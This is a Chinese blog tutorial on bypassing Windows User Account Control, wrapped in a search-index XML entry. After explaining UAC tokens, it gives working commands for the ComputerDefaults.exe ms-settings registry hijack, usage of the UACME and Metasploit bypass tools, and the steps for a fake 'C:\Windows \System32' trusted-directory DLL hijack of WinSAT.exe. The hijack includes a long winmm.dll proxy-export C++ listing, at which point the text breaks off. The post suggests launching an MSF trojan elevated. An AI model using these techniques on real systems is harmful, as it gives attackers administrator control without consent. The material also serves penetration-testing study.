...
<search>
  <entry>
    ...
    <url>/2023/04/15/Bypass%20UAC/</url>
    <content><![CDATA[<h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>首先得知道UAC是啥</p>
<p>在windows vista以后windows推出</p>
<p>UAC    useraccount control    用户账户控制</p>
<p>大概理解一下就是这个东西</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221212132740833.png"  ><span class="image-caption">image-20221212132740833</span></p>
<p>就是每次我们安装东西时弹出来的一个窗口</p>
<p>那为啥会弹出这个提示</p>
<p>虽然我们本机用户是在管理员组</p>
<p>但是，管理员在正常情况下是以低权限执行任务的，这个状态是被保护管理员状态</p>
<p>当管理员要执行高权限操作时，就会弹出UAC</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>UAC作用：<font color='red'>阻止自动安装未经授权的应用，并且防止意外更改系统设置</font></p>
<h3 id="UAC弹出机制"><a href="#UAC弹出机制" class="headerlink" title="UAC弹出机制"></a>UAC弹出机制</h3><p>有的操作不会弹出UAC，有的操作会弹出UAC</p>
<p>UAC会限制所有的用户</p>
<p>普通用户登陆后，系统会创建一个标准用户访问令牌</p>
<p>管理员组用户登陆后，系统会创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌</p>
<p>标准用户访问令牌用于实现普通操作</p>
<p>当需要执行高权限操作时，就会触发UAC，出现弹窗，同意后即可使用管理员访问令牌</p>
<p><font color='red'>当一个非RID为500的账户, 登陆之后用户会被分到两个令牌, 一个是普通访问令牌, 一个是管理员访问令牌</font></p>
<p>普通访问令牌和管理员访问令牌差不多, 管理员令牌只是多了<font color='orange'>windows管理特权和相关的SID</font></p>
<p>当用户只执行普通程序时, 只使用普通访问令牌</p>
<p>当要进行高权限操作时, 就会提示用户, 这是一个高权限操作, 需要用户批准, 同意之后就用管理员令牌进行访问</p>
<h2 id="Bypass-UAC手法"><a href="#Bypass-UAC手法" class="headerlink" title="Bypass UAC手法"></a>Bypass UAC手法</h2><p>在一些场景中，比如我们拿到的用户是管理员组</p>
<p>虽然是属于管理员组，但是操作还是会受限制，并没有相应我们想得到的管理员权限，此时就可以考虑绕过UAC</p>
<p>方法有好几种：</p>
<p><font color='orange'>利用UAC白名单</font></p>
<p><font color='cornflowerblue'>DLL劫持</font></p>
<p><font color='red'>利用COM接口</font></p>
<p><font color='green'>模拟可信任目录</font></p>
<p><font color='orange'>UACME</font></p>
<p><font color='cornflowerblue'>MSF</font></p>
<h3 id="UAC白名单"><a href="#UAC白名单" class="headerlink" title="UAC白名单"></a>UAC白名单</h3><p>windows中UAC是有白名单机制的，即一些白名单中的程序会直接使用管理员权限运行</p>
<p>比如：wusa.exe    rundll32.exe等等</p>
<p>渗透测试过程中可以使用DLL劫持、DLL注入、注册表劫持等方法进行绕过UAC</p>
<p>微软官方提供了专门工具来寻找白名单进程，<font color='red'>Sigcheck</font>    和    <font color='red'>Strings</font></p>
<p>在白名单的程序一般<font color='red'>Manifest数据中的autoElevate的值为True</font></p>
<p>Sigcheck    可以检查某个程序是否有autoElevate属性</p>
<p>Strings    可以找到所有具有autoElevate属性的值</p>
<h4 id="Sigcheck"><a href="#Sigcheck" class="headerlink" title="Sigcheck"></a>Sigcheck</h4><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sigcheck64.<span class="hljs-keyword">exe</span> /accepteula -<span class="hljs-keyword">m</span> C:\Windows\System32\ComputerDefaults.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<p>检查ComputerDefaults.exe是否在白名单中</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221225155913502.png"  ><span class="image-caption">image-20221225155913502</span></p>
<p>证明在白名单中</p>
<h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">strings64.exe <span class="hljs-string">/accepteula</span> -s C:\Windows\System32\*<span class="hljs-string">.exe</span> | findstr <span class="hljs-string">/i</span> <span class="hljs-string">&quot;autoElevate&quot;</span><br></code></pre></td></tr></table></figure>

<p>列出了一堆白名单</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221225165655738.png"  ><span class="image-caption">image-20221225165655738</span></p>
<p>以    ComputerDefaults.exe    为例子</p>
<p>首先打开    process monitor    监听    ComputerDefaults.exe</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221226112638791.png"  ><span class="image-caption">image-20221226112638791</span></p>
<p>空白处需要输入    ComputerDefaults.exe</p>
<p>之后直接运行    ComputerDefaults.exe    即可</p>
<p>发现注册表操作非常多，具体咋看，我也不清楚，参考相关书籍才知道一点点</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221225202240966.png"  ><span class="image-caption">image-20221225202240966</span></p>
<p>查看书籍才知</p>
<p>ComputerDefaults.exe    这个进程执行时会先查询注册表HKCU\Software\Classes\ms-settings\Shell\Open\Command里面的数据</p>
<p>发现路径不存在后，继续查询注册表    HKCR\ms-settings\Shell\Open\Command\DelegateExecute    里面的数据并且读取</p>
<p>因为普通标准用户对注册表键值有修改权限，所以执行命令，来将要执行程序的路径写入默认值和DelegateExecute值</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKCU\Software\Classes\ms-settings\Shell\Open\Command&quot;</span> /d <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKCU\Software\Classes\ms-settings\Shell\Open\Command&quot;</span> /v DelegateExecute /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>



<p>写入之后再次运行    ComputerDefaults.exe</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221225204123684.png"  ><span class="image-caption">image-20221225204123684</span></p>
<p>没有经过UAC就直接弹出cmd窗口</p>
<p>上面是写入cmd，我们可以换成其他的比如，msf的木马</p>
<p>因为是管理员权限运行，所以，直接就可以上线msf，然后getsystem来进行提权</p>
<h3 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h3><p>UACME是一个专门绕过UAC的项目，目前为止包含76种绕过UAC的方法</p>
<p>在UACME中，每一种方法都有一个编号，由主程序Akagi.exe统一调用</p>
<p>使用方法</p>
<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">akagi</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-attr">[key]</span> <span class="hljs-selector-attr">[param]</span><br><br><span class="hljs-selector-id">#key</span>为要使用的方法编号<br><span class="hljs-selector-id">#param</span>为绕过<span class="hljs-selector-tag">uac</span>之后运行的程序或者执行的命令，默认是一个<span class="hljs-selector-tag">cmd</span>窗口<br></code></pre></td></tr></table></figure>
...
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>msf款工具里面也有一些bypass uac的利用模块</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221226135828158.png"  ><span class="image-caption">image-20221226135828158</span></p>
<p>使用对应模块，即可提权</p>
<h3 id="结合DLL劫持来Bypass"><a href="#结合DLL劫持来Bypass" class="headerlink" title="结合DLL劫持来Bypass"></a>结合DLL劫持来Bypass</h3><p>我们可以想到, UAC白名单的程序会加载DLL文件, 那么我们可以通过劫持UAC白名单的DLL文件, 来进行逃过UAC,从而权限提升</p>
<p>但是! UAC白名单加载的这些DLL文件, 基本上都是位于可信任目录中, <font color='red'>普通用户想要修改可信任目录, 不太现实</font></p>
<p>那么我们可以模拟可信任根目录</p>
<h4 id="模拟可信任根目录"><a href="#模拟可信任根目录" class="headerlink" title="模拟可信任根目录"></a>模拟可信任根目录</h4><p>首先得知道, 一个程序想要提升权限, 需要的条件</p>
<p><font color='red'>当白名单程序要求权限提升时</font></p>
<ol>
<li>首先会检查程序的Manifest信息的<font color='red'>autoElevate</font>的值是否为True</li>
<li>再检查可执行文件的<font color='red'>签名</font>, 就不会存在冒充可执行文件的可能</li>
<li>最后就是检查程序<font color='red'>是否位于可信任根目录</font>中</li>
</ol>
<p>上面三个条件缺一不可</p>
<p>前两个条件, 容易满足</p>
<p>找到一个白名单程序, 复制该程序即可</p>
<p><strong>逃过可信任根目录</strong></p>
<p>系统检查可信任根目录的<font color='red'>规则</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">检查时, 系统会执行相关的函数, 来去掉可执行文件路径的空格<br></code></pre></td></tr></table></figure>



<p>那么我们就可以通过路径的命名来模拟一个可信任根目录</p>
<p>自己创建一个路径, 包含空格</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Windows</span> <span class="hljs-string">\System32</span><br></code></pre></td></tr></table></figure>





<h4 id="复现WinSAT-exe"><a href="#复现WinSAT-exe" class="headerlink" title="复现WinSAT.exe"></a>复现WinSAT.exe</h4><p>根据上面原理, 来劫持一个DLL程序</p>
<p><strong>模拟可信任根目录</strong></p>
<figure class="highlight wren"><table><tr><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">md</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows &quot;</span><br><span class="hljs-variable">md</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows \System32&quot;</span><br><span class="hljs-variable">copy</span> <span class="hljs-variable">C</span>:\<span class="hljs-title class_">Windows</span>\<span class="hljs-title class_">System</span>32\<span class="hljs-title class_">Win</span>SAT.<span class="hljs-property">exe</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows \System32\WinSAT.exe&quot;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230414215553547.png"  ><span class="image-caption">image-20230414215553353</span></p>
<p>创建成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230414215624417.png"  ><span class="image-caption">image-20230414215624417</span></p>
<p><strong>分析DLL</strong></p>
<p>运行模拟可信任根目录的文件WinSAT.exe, 并且开启process monitor分析其DLL文件</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230414220709231.png"  ><span class="image-caption">image-20230414220709231</span></p>
<p>发现我们模拟可信任根目录的DLL文件, 加载全部失败了</p>
<p>加载失败的DLL文件</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230414220843337.png"  ><span class="image-caption">image-20230414220843337</span></p>
<p>选择WINMM.dll进行劫持</p>
<p>使用Get-Exports.ps1脚本导出导出函数</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span>-moudle .<span class="hljs-string">\Get-Exports.ps1</span><br><br>Get-Exports -DllPath c:<span class="hljs-string">\Windows\system32\winmm.dll</span> -ExportsToCpp C:<span class="hljs-string">\Users\wo\Desktop\export.txt</span><br></code></pre></td></tr></table></figure>

<p>查看导出函数, 生成C++代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:CloseDriver=[FORWARD_DLL_HERE].CloseDriver,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:DefDriverProc=[FORWARD_DLL_HERE].DefDriverProc,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:DriverCallback=[FORWARD_DLL_HERE].DriverCallback,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:DrvGetModuleHandle=[FORWARD_DLL_HERE].DrvGetModuleHandle,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:GetDriverModuleHandle=[FORWARD_DLL_HERE].GetDriverModuleHandle,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:OpenDriver=[FORWARD_DLL_HERE].OpenDriver,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:PlaySound=[FORWARD_DLL_HERE].PlaySound,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:PlaySoundA=[FORWARD_DLL_HERE].PlaySoundA,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:PlaySoundW=[FORWARD_DLL_HERE].PlaySoundW,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:SendDriverMessage=[FORWARD_DLL_HERE].SendDriverMessage,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:WOWAppExit=[FORWARD_DLL_HERE].WOWAppExit,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxGetDevCapsA=[FORWARD_DLL_HERE].auxGetDevCapsA,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxGetDevCapsW=[FORWARD_DLL_HERE].auxGetDevCapsW,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxGetNumDevs=[FORWARD_DLL_HERE].auxGetNumDevs,@17&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxGetVolume=[FORWARD_DLL_HERE].auxGetVolume,@18&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxOutMessage=[FORWARD_DLL_HERE].auxOutMessage,@19&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:auxSetVolume=[FORWARD_DLL_HERE].auxSetVolume,@20&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyConfigChanged=[FORWARD_DLL_HERE].joyConfigChanged,@21&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetDevCapsA=[FORWARD_DLL_HERE].joyGetDevCapsA,@22&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetDevCapsW=[FORWARD_DLL_HERE].joyGetDevCapsW,@23&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetNumDevs=[FORWARD_DLL_HERE].joyGetNumDevs,@24&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetPos=[FORWARD_DLL_HERE].joyGetPos,@25&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetPosEx=[FORWARD_DLL_HERE].joyGetPosEx,@26&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyGetThreshold=[FORWARD_DLL_HERE].joyGetThreshold,@27&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joyReleaseCapture=[FORWARD_DLL_HERE].joyReleaseCapture,@28&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joySetCapture=[FORWARD_DLL_HERE].joySetCapture,@29&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:joySetThreshold=[FORWARD_DLL_HERE].joySetThreshold,@30&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciDriverNotify=[FORWARD_DLL_HERE].mciDriverNotify,@31&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciDriverYield=[FORWARD_DLL_HERE].mciDriverYield,@32&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciExecute=[FORWARD_DLL_HERE].mciExecute,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciFreeCommandResource=[FORWARD_DLL_HERE].mciFreeCommandResource,@33&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetCreatorTask=[FORWARD_DLL_HERE].mciGetCreatorTask,@34&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetDeviceIDA=[FORWARD_DLL_HERE].mciGetDeviceIDA,@35&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetDeviceIDFromElementIDA=[FORWARD_DLL_HERE].mciGetDeviceIDFromElementIDA,@36&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetDeviceIDFromElementIDW=[FORWARD_DLL_HERE].mciGetDeviceIDFromElementIDW,@37&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetDeviceIDW=[FORWARD_DLL_HERE].mciGetDeviceIDW,@38&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetDriverData=[FORWARD_DLL_HERE].mciGetDriverData,@39&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetErrorStringA=[FORWARD_DLL_HERE].mciGetErrorStringA,@40&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetErrorStringW=[FORWARD_DLL_HERE].mciGetErrorStringW,@41&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciGetYieldProc=[FORWARD_DLL_HERE].mciGetYieldProc,@42&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciLoadCommandResource=[FORWARD_DLL_HERE].mciLoadCommandResource,@43&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSendCommandA=[FORWARD_DLL_HERE].mciSendCommandA,@44&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSendCommandW=[FORWARD_DLL_HERE].mciSendCommandW,@45&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSendStringA=[FORWARD_DLL_HERE].mciSendStringA,@46&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSendStringW=[FORWARD_DLL_HERE].mciSendStringW,@47&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSetDriverData=[FORWARD_DLL_HERE].mciSetDriverData,@48&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mciSetYieldProc=[FORWARD_DLL_HERE].mciSetYieldProc,@49&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiConnect=[FORWARD_DLL_HERE].midiConnect,@50&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiDisconnect=[FORWARD_DLL_HERE].midiDisconnect,@51&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInAddBuffer=[FORWARD_DLL_HERE].midiInAddBuffer,@52&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInClose=[FORWARD_DLL_HERE].midiInClose,@53&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetDevCapsA=[FORWARD_DLL_HERE].midiInGetDevCapsA,@54&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetDevCapsW=[FORWARD_DLL_HERE].midiInGetDevCapsW,@55&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetErrorTextA=[FORWARD_DLL_HERE].midiInGetErrorTextA,@56&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetErrorTextW=[FORWARD_DLL_HERE].midiInGetErrorTextW,@57&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetID=[FORWARD_DLL_HERE].midiInGetID,@58&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInGetNumDevs=[FORWARD_DLL_HERE].midiInGetNumDevs,@59&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInMessage=[FORWARD_DLL_HERE].midiInMessage,@60&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInOpen=[FORWARD_DLL_HERE].midiInOpen,@61&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInPrepareHeader=[FORWARD_DLL_HERE].midiInPrepareHeader,@62&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInReset=[FORWARD_DLL_HERE].midiInReset,@63&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInStart=[FORWARD_DLL_HERE].midiInStart,@64&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInStop=[FORWARD_DLL_HERE].midiInStop,@65&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiInUnprepareHeader=[FORWARD_DLL_HERE].midiInUnprepareHeader,@66&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutCacheDrumPatches=[FORWARD_DLL_HERE].midiOutCacheDrumPatches,@67&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutCachePatches=[FORWARD_DLL_HERE].midiOutCachePatches,@68&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutClose=[FORWARD_DLL_HERE].midiOutClose,@69&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetDevCapsA=[FORWARD_DLL_HERE].midiOutGetDevCapsA,@70&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetDevCapsW=[FORWARD_DLL_HERE].midiOutGetDevCapsW,@71&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetErrorTextA=[FORWARD_DLL_HERE].midiOutGetErrorTextA,@72&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetErrorTextW=[FORWARD_DLL_HERE].midiOutGetErrorTextW,@73&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetID=[FORWARD_DLL_HERE].midiOutGetID,@74&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetNumDevs=[FORWARD_DLL_HERE].midiOutGetNumDevs,@75&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutGetVolume=[FORWARD_DLL_HERE].midiOutGetVolume,@76&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutLongMsg=[FORWARD_DLL_HERE].midiOutLongMsg,@77&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutMessage=[FORWARD_DLL_HERE].midiOutMessage,@78&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutOpen=[FORWARD_DLL_HERE].midiOutOpen,@79&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutPrepareHeader=[FORWARD_DLL_HERE].midiOutPrepareHeader,@80&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutReset=[FORWARD_DLL_HERE].midiOutReset,@81&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutSetVolume=[FORWARD_DLL_HERE].midiOutSetVolume,@82&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutShortMsg=[FORWARD_DLL_HERE].midiOutShortMsg,@83&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiOutUnprepareHeader=[FORWARD_DLL_HERE].midiOutUnprepareHeader,@84&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamClose=[FORWARD_DLL_HERE].midiStreamClose,@85&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamOpen=[FORWARD_DLL_HERE].midiStreamOpen,@86&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamOut=[FORWARD_DLL_HERE].midiStreamOut,@87&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamPause=[FORWARD_DLL_HERE].midiStreamPause,@88&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamPosition=[FORWARD_DLL_HERE].midiStreamPosition,@89&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span 